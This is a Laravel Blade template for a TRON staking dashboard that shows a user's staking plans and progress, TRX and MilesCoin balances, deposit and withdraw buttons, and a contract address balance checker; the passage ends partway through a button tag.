@extends('layouts.app')

@section('content')
<div class="min-h-screen bg-gradient-to-br from-slate-50 via-white to-sky-50 pb-24 pt-6 md:py-12 relative">
    <!-- Background Elements -->
    <div class="absolute inset-0 bg-gradient-to-r from-primary-500/3 via-transparent to-secondary-500/3"></div>
    
    <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 relative z-10">
        <!-- Enhanced Success/Error Messages -->
        <div class="space-y-3 mb-6">
            @if(session('success'))
                <div class="bg-success-50/80 backdrop-blur-xl border border-success-200/50 text-success-700 p-4 rounded-2xl shadow-lg shadow-success-200/30 animate-slide-down">
                    <div class="flex items-center">
                        <svg class="w-5 h-5 mr-3 text-success-600" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z"></path>
                        </svg>
                        {{ session('success') }}
                    </div>
                </div>
            @endif
            @if(session('error'))
                <div class="bg-error-50/80 backdrop-blur-xl border border-error-200/50 text-error-700 p-4 rounded-2xl shadow-lg shadow-error-200/30 animate-slide-down">
                    <div class="flex items-center">
                        <svg class="w-5 h-5 mr-3 text-error-600" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-3L13.732 4c-.77-1.333-2.694-1.333-3.464 0L3.34 16c-.77 1.333.192 3 1.732 3z"></path>
                        </svg>
                        {{ session('error') }}
                    </div>
                </div>
            @endif
        </div>

        <div class="space-y-6 md:space-y-8">
            <!-- Enhanced Active Stakings Section -->
            <div class="bg-white/80 backdrop-blur-xl rounded-3xl shadow-xl shadow-slate-200/50 border border-white/20 overflow-hidden">
                <div class="p-6 md:p-8">
                    <div class="flex items-center justify-between mb-6">
                        <div class="flex items-center space-x-3">
                            <div class="w-12 h-12 bg-gradient-to-br from-primary-500 to-secondary-500 rounded-2xl flex items-center justify-center shadow-lg shadow-primary-500/30">
                                <svg class="w-6 h-6 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M13 10V3L4 14h7v7l9-11h-7z"></path>
                                </svg>
                            </div>
                            <div>
                                <h2 class="text-xl md:text-2xl font-bold text-neutral-900">Active Stakings</h2>
                                <p class="text-sm text-neutral-600">Monitor your earning opportunities</p>
                            </div>
                        </div>
                        <a href="{{ route('dashboard.plans') }}" class="inline-flex items-center px-4 py-2 bg-gradient-to-r from-primary-500 to-secondary-500 text-white rounded-xl font-medium hover:from-primary-600 hover:to-secondary-600 transition-all duration-200 shadow-lg shadow-primary-500/30 hover:shadow-xl hover:shadow-primary-500/40">
                            <span class="hidden sm:inline">View All Plans</span>
                            <span class="sm:hidden">Plans</span>
                            <svg class="w-4 h-4 ml-2" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 5l7 7-7 7"></path>
                            </svg>
                        </a>
                    </div>

                    <div class="space-y-6" id="active-stakings-container">
                        @php
                            $activeStakings = auth()->user()->stakings()
                                ->with('plan')
                                ->whereIn('status', ['active', 'completed'])
                                ->get();
                        @endphp

                        @forelse($activeStakings as $staking)
                            @php
                                $duration = $staking->plan->duration;
                                $daysElapsed = number_format($staking->staked_at->diffInDays(now(), true), 2);
                                $progress = min(100, ($daysElapsed / $duration) * 100);
                                $dailyEarnings = ($staking->amount * ($staking->plan->interest_rate)) / 100;
                                
                                $isCompleted = $staking->status === 'completed';
                                
                                $daysRemaining = number_format(max(0, $duration - $daysElapsed), 2);
                                $endDate = $staking->staked_at->copy()->addDays($duration);

                                $dailyProgress = (float) $staking->progress;
                                $lastRewardTime = $staking->last_reward_at ?? $staking->staked_at;
                                $nextPayout = $lastRewardTime->copy()->addHours(24);
                                $earnedSoFar = ($dailyProgress / 100) * $dailyEarnings;
                            @endphp

                            <div class="bg-gradient-to-br from-white/60 to-slate-50/60 backdrop-blur-xl rounded-2xl overflow-hidden border border-white/30 shadow-lg shadow-slate-200/30 {{ $isCompleted ? 'opacity-75' : '' }}" data-staking-id="{{ $staking->id }}">
                                <div class="p-6">
                                    <!-- Enhanced Header -->
                                    <div class="flex justify-between items-start mb-6">
                                        <div class="flex items-center space-x-4">
                                            <div class="w-14 h-14 bg-gradient-to-br {{ $isCompleted ? 'from-neutral-400 to-neutral-500' : 'from-primary-500 to-secondary-500' }} rounded-2xl flex items-center justify-center shadow-lg {{ $isCompleted ? 'shadow-neutral-500/30' : 'shadow-primary-500/30' }}">
                                                <svg class="w-7 h-7 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                                                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M13 10V3L4 14h7v7l9-11h-7z"></path>
                                                </svg>
                                            </div>
                                            <div>
                                                <div class="flex items-center space-x-2">
                                                    <h3 class="text-lg font-bold text-neutral-900">{{ $staking->plan->name }}</h3>
                                                    @if($isCompleted)
                                                        <span class="bg-neutral-100 text-neutral-600 px-3 py-1 rounded-full text-xs font-medium">Completed</span>
                                                    @else
                                                        <span class="bg-success-100 text-success-700 px-3 py-1 rounded-full text-xs font-medium">Active</span>
                                                    @endif
                                                </div>
                                                <p class="text-sm text-neutral-600 mt-1">
                                                    Started {{ $staking->staked_at->format('M d, Y') }}
                                                    @if($isCompleted)
                                                        · Completed {{ $staking->end_at ? $staking->end_at->format('M d, Y') : $endDate->format('M d, Y') }}
                                                    @endif
                                                </p>
                                            </div>
                                        </div>
                                        <div class="bg-gradient-to-r {{ $isCompleted ? 'from-neutral-100 to-neutral-50' : 'from-success-100 to-emerald-50' }} px-4 py-2 rounded-2xl text-sm font-semibold {{ $isCompleted ? 'text-neutral-600' : 'text-success-700' }} shadow-sm">
                                            @if($isCompleted)
                                                Final: +{{ number_format($staking->earned_amount, 6) }} TRX
                                            @else
                                                +{{ number_format($dailyEarnings, 6) }} TRX/day
                                            @endif
                                        </div>
                                    </div>

                                    <!-- Enhanced Stats Grid -->
                                    <div class="grid grid-cols-1 sm:grid-cols-2 gap-4 mb-6">
                                        <div class="bg-gradient-to-br from-white/80 to-slate-50/80 backdrop-blur-sm rounded-2xl p-4 border border-white/20">
                                            <div class="flex items-center space-x-3">
                                                <div class="w-10 h-10 bg-primary-100 rounded-xl flex items-center justify-center">
                                                    <svg class="w-5 h-5 text-primary-600" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                                                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 8c-1.657 0-3 .895-3 2s1.343 2 3 2 3 .895 3 2-1.343 2-3 2m0-8c1.11 0 2.08.402 2.599 1M12 8V7m0 1v8m0 0v1m0-1c-1.11 0-2.08-.402-2.599-1M21 12a9 9 0 11-18 0 9 9 0 0118 0z"></path>
                                                    </svg>
                                                </div>
                                                <div>
                                                    <span class="text-sm font-medium text-neutral-600">Staked Amount</span>
                                                    <p class="text-lg font-bold text-neutral-900">{{ number_format($staking->amount, 6) }} TRX</p>
                                                </div>
                                            </div>
                                        </div>
                                        <div class="bg-gradient-to-br from-white/80 to-slate-50/80 backdrop-blur-sm rounded-2xl p-4 border border-white/20">
                                            <div class="flex items-center space-x-3">
                                                <div class="w-10 h-10 bg-success-100 rounded-xl flex items-center justify-center">
                                                    <svg class="w-5 h-5 text-success-600" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                                                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M7 12l3-3 3 3 4-4M8 21l4-4 4 4M3 4h18M4 4h16v12a1 1 0 01-1 1H5a1 1 0 01-1-1V4z"></path>
                                                    </svg>
                                                </div>
                                                <div>
                                                    <span class="text-sm font-medium text-neutral-600">{{ $isCompleted ? 'Total Earned' : 'Earned So Far' }}</span>
                                                    <p class="text-lg font-bold {{ $isCompleted ? 'text-neutral-900' : 'text-success-600' }}" data-earned-amount="{{ $staking->id }}">
                                                        +{{ number_format($staking->earned_amount, 6) }} TRX
                                                    </p>
                                                </div>
                                            </div>
                                        </div>
                                    </div>

                                    <!-- Enhanced Overall Progress -->
                                    <div class="space-y-4 mb-6">
                                        <div class="flex justify-between items-center text-sm">
                                            <span class="font-medium text-neutral-700">Overall Progress</span>
                                            <span class="font-bold text-neutral-900">
                                                @if($isCompleted)
                                                    Completed {{ $duration }} Days
                                                @else
                                                    Day {{ floor($daysElapsed) }}/{{ $duration }}
                                                @endif
                                            </span>
                                        </div>
                                        <div class="relative">
                                            <div class="w-full bg-gradient-to-r from-neutral-200 to-neutral-100 rounded-full h-3 shadow-inner">
                                                <div class="bg-gradient-to-r {{ $isCompleted ? 'from-neutral-400 to-neutral-500' : 'from-primary-500 to-secondary-500' }} h-3 rounded-full transition-all duration-500 shadow-sm"
                                                     style="width: {{ $isCompleted ? '100' : $progress }}%"></div>
                                            </div>
                                            <div class="absolute inset-0 bg-gradient-to-r from-white/20 to-transparent rounded-full"></div>
                                        </div>
                                        <div class="flex justify-between text-xs">
                                            @if($isCompleted)
                                                <span class="text-success-600 font-medium">Plan completed successfully</span>
                                                <span class="text-neutral-500">Duration: {{ $duration }} days</span>
                                            @else
                                                <span class="text-neutral-600">{{ $daysRemaining }} days remaining</span>
                                                <span class="text-neutral-500">Ends {{ $endDate->format('M d, Y') }}</span>
                                            @endif
                                        </div>
                                    </div>

                                    @if(!$isCompleted)
                                    <!-- Enhanced Daily Progress -->
                                    <div class="bg-gradient-to-br from-primary-50/80 to-secondary-50/80 backdrop-blur-sm rounded-2xl p-4 border border-white/30">
                                        <div class="flex justify-between items-center mb-3">
                                            <span class="text-sm font-semibold text-neutral-700">Today's Progress</span>
                                            <span class="text-sm font-bold text-success-600" data-today-earnings="{{ $staking->id }}">+{{ number_format($earnedSoFar, 6) }} / {{ number_format($dailyEarnings, 6) }} TRX</span>
                                        </div>
                                        <div class="relative mb-3">
                                            <div class="w-full bg-gradient-to-r from-neutral-200 to-neutral-100 rounded-full h-2.5 shadow-inner">
                                                <div class="bg-gradient-to-r from-success-500 to-emerald-500 h-2.5 rounded-full transition-all duration-500 shadow-sm"
                                                     data-progress-bar="{{ $staking->id }}"
                                                     style="width: {{ $dailyProgress }}%"></div>
                                            </div>
                                            <div class="absolute inset-0 bg-gradient-to-r from-white/20 to-transparent rounded-full"></div>
                                        </div>
                                        <div class="flex justify-between text-xs">
                                            <span class="text-neutral-600" data-last-reward="{{ $staking->id }}">Last: {{ $lastRewardTime->format('M d, H:i') }}</span>
                                            <span class="text-neutral-600" data-next-reward="{{ $staking->id }}">Next: {{ $nextPayout->format('M d, H:i') }}</span>
                                        </div>

                                        <!-- Enhanced Debug Information -->
                                        <div class="relative mt-3">
                                            <button onclick="toggleDebugInfo({{ $staking->id }})" class="text-neutral-400 hover:text-neutral-600 transition-colors">
                                                <svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                                                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M13 16h-1v-4h-1m1-4h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z"></path>
                                                </svg>
                                            </button>
                                            <div id="debug-info-{{ $staking->id }}" class="hidden mt-3 p-3 bg-white/60 backdrop-blur-sm rounded-xl border border-white/20 text-xs" data-debug-info="{{ $staking->id }}">
                                                <div class="font-semibold text-neutral-700 mb-2">Staking Details:</div>
                                                <div class="space-y-1">
                                                    <div class="flex justify-between">
                                                        <span class="text-neutral-600">Last Reward:</span>
                                                        <span class="text-neutral-800 font-mono" data-debug-last="{{ $staking->id }}">{{ $lastRewardTime->format('Y-m-d H:i:s') }}</span>
                                                    </div>
                                                    <div class="flex justify-between">
                                                        <span class="text-neutral-600">Hours Since:</span>
                                                        <span class="text-neutral-800 font-mono" data-debug-hours="{{ $staking->id }}">0</span>
                                                    </div>
                                                    <div class="flex justify-between">
                                                        <span class="text-neutral-600">Progress:</span>
                                                        <span class="text-neutral-800 font-mono" data-debug-progress="{{ $staking->id }}">{{ number_format($dailyProgress, 2) }}%</span>
                                                    </div>
                                                    <div class="flex justify-between">
                                                        <span class="text-neutral-600">Next Payout:</span>
                                                        <span class="text-neutral-800 font-mono" data-debug-next="{{ $staking->id }}">{{ $nextPayout->format('Y-m-d H:i:s') }}</span>
                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                    @else
                                    <!-- Enhanced Completed Staking Summary -->
                                    <div class="bg-gradient-to-br from-neutral-50/80 to-slate-50/80 backdrop-blur-sm rounded-2xl p-4 border border-white/30">
                                        <div class="flex items-center justify-between">
                                            <div class="flex items-center space-x-3">
                                                <div class="w-8 h-8 bg-success-100 rounded-xl flex items-center justify-center">
                                                    <svg class="w-4 h-4 text-success-600" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                                                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z"></path>
                                                    </svg>
                                                </div>
                                                <span class="text-sm font-medium text-neutral-700">Total Profit</span>
                                            </div>
                                            <span class="text-lg font-bold text-success-600">+{{ number_format($staking->earned_amount, 6) }} TRX</span>
                                        </div>
                                    </div>
                                    @endif
                                </div>
                            </div>

                        @empty
                            <div class="text-center py-16 bg-gradient-to-br from-white/60 to-slate-50/60 backdrop-blur-xl rounded-2xl border border-white/30">
                                <div class="w-20 h-20 bg-gradient-to-br from-primary-100 to-secondary-100 rounded-3xl flex items-center justify-center mx-auto mb-6">
                                    <svg class="w-10 h-10 text-primary-600" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 8c-1.657 0-3 .895-3 2s1.343 2 3 2 3 .895 3 2-1.343 2-3 2m0-8c1.11 0 2.08.402 2.599 1M12 8V7m0 1v8m0 0v1m0-1c-1.11 0-2.08-.402-2.599-1M21 12a9 9 0 11-18 0 9 9 0 0118 0z"></path>
                                    </svg>
                                </div>
                                <h3 class="text-xl font-bold text-neutral-900 mb-2">No Active Stakings</h3>
                                <p class="text-neutral-600 mb-8 max-w-md mx-auto">Start your first staking plan to begin earning daily rewards from your cryptocurrency investments</p>
                                <a href="{{ route('dashboard.plans') }}" class="inline-flex items-center px-8 py-4 bg-gradient-to-r from-primary-500 to-secondary-500 text-white rounded-2xl font-semibold hover:from-primary-600 hover:to-secondary-600 transition-all duration-200 shadow-lg shadow-primary-500/30 hover:shadow-xl hover:shadow-primary-500/40">
                                    <svg class="w-5 h-5 mr-2" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M13 10V3L4 14h7v7l9-11h-7z"></path>
                                    </svg>
                                    <span>View Staking Plans</span>
                                </a>
                            </div>
                        @endforelse
                    </div>
                </div>
            </div>

            <!-- Enhanced Total Earnings Card -->
            <div class="bg-gradient-to-br from-success-50/80 to-emerald-50/80 backdrop-blur-xl rounded-3xl shadow-xl shadow-success-200/30 border border-success-200/50 p-6">
                <div class="flex items-center space-x-4">
                    <div class="w-16 h-16 bg-gradient-to-br from-success-500 to-emerald-500 rounded-3xl flex items-center justify-center shadow-lg shadow-success-500/30">
                        <svg class="w-8 h-8 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M7 12l3-3 3 3 4-4M8 21l4-4 4 4M3 4h18M4 4h16v12a1 1 0 01-1 1H5a1 1 0 01-1-1V4z"></path>
                        </svg>
                    </div>
                    <div class="flex-1">
                        <h3 class="text-lg font-semibold text-success-800">Total Earnings</h3>
                        <div class="flex items-baseline space-x-2 mt-1">
                            <span class="text-3xl md:text-4xl font-bold text-success-900">
                                {{ number_format(auth()->user()->total_earnings, 6) }}
                            </span>
                            <span class="text-success-700 font-medium">TRX</span>
                        </div>
                        <div class="mt-2 space-y-1">
                            <p class="text-sm text-success-700">Total earnings from all stakings</p>
                            <p class="text-xs text-success-600">Earned values update within 24 hours</p>
                        </div>
                    </div>
                </div>
            </div>

            <!-- Enhanced Your Wallet Section -->
            <div class="bg-white/80 backdrop-blur-xl rounded-3xl shadow-xl shadow-slate-200/50 border border-white/20 overflow-hidden">
                <div class="p-6 md:p-8">
                    <div class="flex items-center justify-between mb-6">
                        <div class="flex items-center space-x-3">
                            <div class="w-12 h-12 bg-gradient-to-br from-primary-500 to-secondary-500 rounded-2xl flex items-center justify-center shadow-lg shadow-primary-500/30">
                                <svg class="w-6 h-6 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M3 10h18M7 15h1m4 0h1m-7 4h12a3 3 0 003-3V8a3 3 0 00-3-3H6a3 3 0 00-3 3v8a3 3 0 003 3z"></path>
                                </svg>
                            </div>
                            <div>
                                <h2 class="text-xl md:text-2xl font-bold text-neutral-900">Your Wallet</h2>
                                <p class="text-sm text-neutral-600">Manage your TRX balance</p>
                            </div>
                        </div>
                    </div>

                    @if(auth()->user()->wallet)
                        <div class="bg-gradient-to-br from-primary-50/80 to-secondary-50/80 backdrop-blur-sm rounded-2xl p-6 mb-6 border border-white/30">
                            <div class="flex items-center justify-between mb-4">
                                <span class="text-sm font-semibold text-neutral-700">Available Balance</span>
                                <button onclick="refreshBalance()" id="refresh-button" class="group flex items-center space-x-2 text-primary-600 hover:text-primary-700 transition-all duration-200 transform hover:scale-105" title="Refresh balance">
                                    <svg class="w-5 h-5 group-hover:rotate-180 transition-transform duration-300" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 4v5h.582m15.356 2A8.001 8.001 0 004.582 9m0 0H9m11 11v-5h-.581m0 0a8.003 8.003 0 01-15.357-2m15.357 2H15"></path>
                                    </svg>
                                    <span class="text-sm font-medium">Refresh</span>
                                </button>
                            </div>
                            <div class="flex items-baseline space-x-3">
                                <span id="wallet-balance" class="text-3xl md:text-4xl font-bold text-neutral-900">0.000000</span>
                                <span class="text-lg text-neutral-600 font-medium">TRX</span>
                            </div>
                            <div id="balance-status" class="text-xs text-neutral-500 mt-2"></div>
                            <div class="text-xs text-neutral-400 mt-2 flex items-center">
                                <svg class="w-3 h-3 mr-1" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 8v4l3 3m6-3a9 9 0 11-18 0 9 9 0 0118 0z"></path>
                                </svg>
                                Balance updates may take 2-5 minutes to reflect
                            </div>
                        </div>

                        <!-- Enhanced Action Buttons -->
                        <div class="grid grid-cols-2 gap-4">
                            <button onclick="showDepositModal()"
                                class="group flex items-center justify-center px-6 py-4 bg-gradient-to-r from-primary-500 to-secondary-500 text-white rounded-2xl font-semibold hover:from-primary-600 hover:to-secondary-600 transition-all duration-200 shadow-lg shadow-primary-500/30 hover:shadow-xl hover:shadow-primary-500/40">
                                <svg class="w-5 h-5 mr-2 group-hover:scale-110 transition-transform" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 4v16m8-8H4"></path>
                                </svg>
                                <span>Deposit</span>
                            </button>
                            @if(auth()->user()->google2fa_enabled)
                                <a href="{{ route('dashboard.withdraw') }}"
                                    class="group flex items-center justify-center px-6 py-4 bg-gradient-to-r from-tron-500 to-amber-500 text-white rounded-2xl font-semibold hover:from-tron-600 hover:to-amber-600 transition-all duration-200 shadow-lg shadow-tron-500/30 hover:shadow-xl hover:shadow-tron-500/40">
                                    <svg class="w-5 h-5 mr-2 group-hover:scale-110 transition-transform" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 8c-1.657 0-3 .895-3 2s1.343 2 3 2 3 .895 3 2-1.343 2-3 2m0-8c1.11 0 2.08.402 2.599 1M12 8V7m0 1v8m0 0v1m0-1c-1.11 0-2.08-.402-2.599-1M21 12a9 9 0 11-18 0 9 9 0 0118 0z"></path>
                                    </svg>
                                    <span>Withdraw</span>
                                </a>
                            @else
                                <button onclick="show2FAAlert()"
                                    class="group flex items-center justify-center px-6 py-4 bg-gradient-to-r from-neutral-400 to-neutral-500 text-white rounded-2xl font-semibold cursor-help transition-all duration-200 shadow-lg shadow-neutral-400/30 hover:shadow-xl hover:shadow-neutral-400/40 relative">
                                    <svg class="w-5 h-5 mr-2" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z"/>
                                    </svg>
                                    <span>Withdraw</span>
                                    <div class="absolute -top-2 -right-2 w-5 h-5 bg-warning-500 rounded-full flex items-center justify-center">
                                        <svg class="w-3 h-3 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-3L13.732 4c-.77-1.333-2.694-1.333-3.464 0L3.34 16c-.77 1.333.192 3 1.732 3z"/>
                                        </svg>
                                    </div>
                                </button>
                            @endif
                        </div>
                    @else
                        <div class="bg-gradient-to-br from-error-50/80 to-red-50/80 backdrop-blur-sm rounded-2xl p-6 border border-error-200/50">
                            <div class="flex items-center space-x-4">
                                <div class="w-12 h-12 bg-error-100 rounded-2xl flex items-center justify-center">
                                    <svg class="w-6 h-6 text-error-600" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-3L13.732 4c-.77-1.333-2.694-1.333-3.464 0L3.34 16c-.77 1.333.192 3 1.732 3z"></path>
                                    </svg>
                                </div>
                                <div>
                                    <p class="text-sm text-error-700 font-semibold">No wallet found</p>
                                    <p class="text-xs text-error-600">Please contact support for assistance</p>
                                </div>
                            </div>
                        </div>
                    @endif
                </div>
            </div>

            <!-- Enhanced MilesCoin Balance Section -->
            <div class="bg-white/80 backdrop-blur-xl rounded-3xl shadow-xl shadow-slate-200/50 border border-white/20 overflow-hidden">
                <div class="p-6 md:p-8">
                    <div class="flex items-center justify-between mb-6">
                        <div class="flex items-center space-x-3">
                            <div class="w-12 h-12 bg-gradient-to-br from-purple-500 to-pink-500 rounded-2xl flex items-center justify-center shadow-lg shadow-purple-500/30">
                                <svg class="w-6 h-6 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M13 10V3L4 14h7v7l9-11h-7z"></path>
                                </svg>
                            </div>
                            <div>
                                <h2 class="text-xl md:text-2xl font-bold text-neutral-900">MilesCoin Balance</h2>
                                <p class="text-sm text-neutral-600">Manage your MSC balance</p>
                            </div>
                        </div>
                    </div>

                    <div class="bg-gradient-to-br from-purple-50/80 to-pink-50/80 backdrop-blur-sm rounded-2xl p-6 mb-6 border border-white/30">
                        <div class="flex items-center justify-between mb-4">
                            <span class="text-sm font-semibold text-neutral-700">Available for Staking</span>
                            <div class="flex items-baseline space-x-2">
                                <span class="text-lg md:text-2xl font-bold text-neutral-900">
                                    {{ number_format(auth()->user()->wallet->miles_balance ?? 0, 6) }}
                                </span>
                                <span class="text-neutral-600 font-medium">MSC</span>
                            </div>
                        </div>
                        <div class="grid grid-cols-2 gap-4">
                            <a href="{{ route('dashboard.convert') }}"
                                class="group flex items-center justify-center px-6 py-4 bg-gradient-to-r from-purple-500 to-pink-500 text-white rounded-2xl font-semibold hover:from-purple-600 hover:to-pink-600 transition-all duration-200 shadow-lg shadow-purple-500/30 hover:shadow-xl hover:shadow-purple-500/40">
                                <svg class="w-5 h-5 mr-2 group-hover:scale-110 transition-transform" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M8 7h12m0 0l-4-4m4 4l-4 4m0 6H4m0 0l4 4m-4-4l4-4"></path>
                                </svg>
                                <span>Convert TRX</span>
                            </a>
                            <a href="{{ route('dashboard.plans') }}"
                                class="group flex items-center justify-center px-6 py-4 bg-gradient-to-r from-blue-500 to-teal-500 text-white rounded-2xl font-semibold hover:from-blue-600 hover:to-teal-600 transition-all duration-200 shadow-lg shadow-blue-500/30 hover:shadow-xl hover:shadow-blue-500/40">
                                <svg class="w-5 h-5 mr-2 group-hover:scale-110 transition-transform" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M13 10V3L4 14h7v7l9-11h-7z"></path>
                                </svg>
                                <span>Stake Now</span>
                            </a>
                        </div>
                    </div>
                </div>
            </div>

            <!-- Enhanced Contract Balance Checker -->
            <div class="bg-white/80 backdrop-blur-xl rounded-3xl shadow-xl shadow-slate-200/50 border border-white/20 overflow-hidden">
                <div class="p-6 md:p-8">
                    <div class="flex items-center justify-between mb-6">
                        <div class="flex items-center space-x-3">
                            <div class="w-12 h-12 bg-gradient-to-br from-blue-500 to-teal-500 rounded-2xl flex items-center justify-center shadow-lg shadow-blue-500/30">
                                <svg class="w-6 h-6 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M8 5H6a2 2 0 00-2 2v12a2 2 0 002 2h10a2 2 0 002-2v-1M8 5a2 2 0 002 2h2a2 2 0 002-2M8 5a2 2 0 012-2h2a2 2 0 012 2m0 0h2a2 2 0 012 2v3m2 4H10m0 0l3-3m-3 3l3 3"></path>
                                </svg>
                            </div>
                            <div>
                                <h2 class="text-xl md:text-2xl font-bold text-neutral-900">Contract Balance Checker</h2>
                                <p class="text-sm text-neutral-600">Check your TRX balance</p>
                            </div>
                        </div>
                    </div>

                    <!-- Predefined Contract Address -->
                    <div class="mb-6 bg-gradient-to-br from-blue-50/80 to-teal-50/80 backdrop-blur-sm rounded-2xl p-6 border border-white/30">
                        <div class="flex items-center justify-between mb-4">
                            <h3 class="text-lg font-semibold text-neutral-800">Miles Contract Address</h3>
                            <div class="flex space-x-2">
                                <button onclick="copyContractAddress()"
                                    class="group flex items-center px-3 py-2 text-primary-600 hover:text-primary-700 border border-primary-200 rounded-xl hover:bg-primary-50 transition-all duration-200">
                                    <svg class="w-4 h-4 mr-2 group-hover:scale-110 transition-transform" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M8 5H6a2 2 0 00-2 2v12a2 2 0 002 2h10a2 2 0 002-2v-1M8 5a2 2 0 002 2h2a2 2 0 002-2M8 5a2 2 0 012-2h2a2 2 0 012 2m0 0h2a2 2 0 012 2v3m2 4H10m0 0l3-3m-3 3l3 3"></path>
                                    </svg>
                                    <span class="text-sm font-medium">Copy</span>
                                </button>
                                <button onclick="checkContractBalance()"
                                    class="group flex items-center px-4 py-2 bg-gradient-to-r from-primary-500 to-secondary-500 text-white rounded-xl font-medium hover:from-primary-600 hover:to-secondary-600 transition-all duration-200 shadow-lg shadow-primary-500/30">
                                    <svg class="w-4 h-4 mr-2 group-hover:scale-110 transition-transform" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 5H7a2 2 0 00-2 2v12a2 2 0 002 2h10a2 2 0 002-2V7a2 2 0 00-2-2H9m4 8V9m0 0l-2 2m2-2l2 2"></path>
                                    </svg>
                                    <span class="text-sm">Check Balance</span>
                                </button>
                            </div>
                        </div>
                        <div class="bg-white/60 backdrop-blur-sm rounded-xl p-4 border border-white/20">
                            <code class="block text-sm font-mono text-neutral-800 break-all">TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t</code>
                        </div>
                    </div>

                    <!-- Custom Address Input -->
                    <div class="space-y-4">
                        <div class="relative group">
                            <label class="block text-sm font-semibold text-neutral-700 mb-2">
                                Check Other Address Balance
                            </label>
                            <div class="relative">
                                <div class="absolute inset-y-0 left-0 pl-4 flex items-center pointer-events-none">
                                    <svg class="h-5 w-5 text-neutral-400 group-focus-within:text-primary-500 transition-colors" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M8 5H6a2 2 0 00-2 2v12a2 2 0 002 2h10a2 2 0 002-2v-1M8 5a2 2 0 002 2h2a2 2 0 002-2M8 5a2 2 0 012-2h2a2 2 0 012 2m0 0h2a2 2 0 012 2v3m2 4H10m0 0l3-3m-3 3l3 3"></path>
                                    </svg>
                                </div>
                                <input type="text"
                                    id="contract-address-input"
                                    class="w-full pl-12 pr-4 py-3 bg-white/60 border border-neutral-200 rounded-2xl text-neutral-900 placeholder-neutral-500 focus:outline-none focus:ring-2 focus:ring-primary-500/20 focus:border-primary-500 transition-all duration-300"
                                    placeholder="Enter TRX address starting with T..."
                                    pattern="^T[A-Za-z0-9]{33}$">
                            </div>
                            <p class="text-xs text-neutral-500 mt-2">Enter a valid TRON address to check its TRX balance</p>
                        </div>

                        <button onclick="checkBalance()"
